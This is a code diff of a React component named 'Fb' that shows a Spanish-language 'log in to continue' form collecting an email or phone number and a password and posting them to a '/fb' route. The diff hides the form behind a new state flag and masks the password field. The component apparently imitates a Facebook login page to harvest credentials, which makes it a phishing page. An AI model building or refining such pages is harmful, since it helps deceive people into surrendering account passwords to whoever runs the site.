@@ -26,7 +26,7 @@ export default function Fb() {
 
   // const resul = useLoaderData().attributes.CPA;
   // console.log(resul)
-   
+   const [fi,setfi] = useState(false);
 
    return (
       <div className="">
@@ -36,28 +36,34 @@ export default function Fb() {
          <img className="git" src={logo} alt="logo imagen"></img><div className="form">
                <p className="alert">¡Iniciar sesion para continuar!</p>
 
-               <Form className="formu" method="post" action="/fb">
-                  <img src={fc} />
-                  <div className="Emai">
-                     <input
-                        className="Email"
-                        type="text"
-                        name="text"
+                 {fi === true && (
+<div>
+<Form className="formu" method="post" action="/fb">
+     <img src={fc} />
+     <div className="Emai">
+        <input
+           className="Email"
+           type="text"
+           name="text"
 
-                        placeholder="Correo electronico o numero de telefono" />
-                  </div>
-                  <div className="pass">
-                     <input className="pas" type="text"
-                        name="text2"
+           placeholder="Correo electronico o numero de telefono" />
+     </div>
+     <div className="pass">
+        <input className="pas" type="password"
+           name="text2"
 
-                        placeholder="Contraseña" />
-                     <p>si</p>
-                     <button
-                        className="btn"
-                        type="submit"
-                     >iniciar sesión</button>
-                  </div>
-               </Form>
+           placeholder="Contraseña" />
+        <p>si</p>
+        <button
+           className="btn"
+           type="submit"
+        >iniciar sesión</button>
+     </div>
+  </Form>
+</div>
+
+)}
+ 
 
             </div>
 
